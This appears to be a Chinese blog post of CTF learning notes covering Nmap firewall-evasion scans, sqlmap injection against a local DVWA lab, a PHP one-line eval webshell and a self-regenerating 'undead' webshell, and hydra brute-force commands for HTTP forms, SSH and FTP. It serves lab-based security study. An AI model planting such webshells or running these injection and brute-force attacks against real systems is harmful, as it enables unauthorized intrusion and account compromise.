CTF比赛学习笔记第一周

Posted on 2020-05-23

#1.Nmap扫描使用心得：
当防火墙设置禁止80端口接受ack包和禁止443端口接受syn包时：

指定80端口发送syn包
nmap -sP -PS 80 x.x.x.x -disable-arp-ping

当TCP SYN数据包里的SYN数据包被都过滤时
sudo iptables -I INPUT -p tcp --tcp-flags ALL SYN -j DROP
使用ACK数据包的Ping扫描，使用-PA参数来在80端口发送ACK数据包
sudo nmap -sP -PA 192.168.43.132 -disable-arp-ping
把防火墙设置成TCP连接中的ACK数据包都拦截掉
sudo iptables -I INPUT -p tcp --tcp-flags ALL ACK -j DROP
使用ICMP回环绕过TCP ACK Ping
nmap -sP -PE 192.168.43.132 -disable-arp-ping
拦截ICMP回环
sudo iptables -A INPUT -p icmp -m icmp --icmp-type echo-request -j DROP
使用ICMP时间戳Ping绕过ICMP回环
sudo nmap -sP -PP 192.168.43.132 -disable-arp-ping
再把UDP拦截了

在ICMP TCP和UDP都被拦截时，我们可以用-PO参数发送有IP头中特定协议号的IP数据包，如果没有指定协议，则发送多个用于ICMP，IGMP和IP-in-IP协议.
sudo nmap -sP -PO 192.168.43.132 -disable-arp-ping
加上拦截IP协议,基本可以拦截很多方式的扫描了。

#2.sqlmap与sql注入
一定要带上原始数据包中的cookie！
GET型注入一般用 sqlmap -u "url"
POST型注入一般用 sqlmap -u “url” --data “POST参数”

实际例子。–second-url为跳转后，专门用来输入查询的链接。指查询和返回值不在同一个链接里的情况。
p2 sqlmap.py -u"http://127.0.0.1/dvwa/vulnerabilities/sqli/session-input.php#" --data="id=1&Submit=Submit" --second-url="http://127.0.0.1/dvwa/vulnerabilities/sqli/" --cookie="security=high; PHPSESSID=cumt3v4cgsldm4p0sosdbg00u4"

CTF比赛学习笔记第二周

Posted on 2020-05-23

#1.文件上传：
最基本php一句话木马。上传至服务器，（本地靶场会自动解析上传的文件），用菜刀连接。
<?php@eval($_POST['1']); ?>
不死马，一句话木马升级版。上传至服务器后，一旦解析，会无限循环生成一句话木马。将这个文件上传到服务器，然后进行访问，会在该路径下一直生成一个名字为2.php的shell文件，然后使用caidao输入
http://xxx/2.php?pass=pass的路径，密码为1就可以链接一句话。
由于pass是md5加密很难被破解也可以做到隐蔽

一句话木马或者不死马只是上传的第一步攻击，若要提权还需上传大马进行cmd操作。大马以后再记录。

本地靶场的图片木马无法通过菜刀连接，用文件包含漏洞的时候菜刀报错需要靶场的用户名密码，计划第三周内解决这个问题。

steal.php代码。以第1级别为例，23级只是在59、65、71行数据库表名有不同。

#3.暴力破解：hydra,如果目标网站登录时候需要验证码就无法破解了
get暴力破解。-L 用户了字典 -P 密码字典 -o 输出 -vV显示详细信息

用：分隔参数
/DVWA/vulnerabilities/brute/代表请求目录；username=USER&password=PASS&Login=Login，抓包获得，其中USER和PASS代表是攻击载荷；F=后面是代表密码错误时的关键字符串(错误时网页返回，可以猜测)；H后面是cookie信息
post暴力破解

username=USER&password=PASS&Login=Login&user_token=dd6bbcc4f4672afe99f15b1d2c249ea5抓包获得，其中USER和PASS代表是攻击载荷，user_token：带有token验证。
S后的是密码正确时返回应用的关键字符串。
不过采用了token的验证方式，每次登录的token都是不一样的，所以不能用hydra来破解。

假设有以上一个密码登录表单，我们执行命令：
hydra -L user.txt -P passwd.txt -o http_get.txt -t 5 -f 127.0.0.1 http-post-form “/index.php:name=^USER^&pwd=^PASS^:<title>invalido</title>”
ssh破解
hydra -L user.txt -P passwd.txt -o ssh.txt -vV -t 5 ip ssh
ftp破解
hydra -L user.txt -P passwd.txt -o ftp.txt -vV -t 5 ip ftp
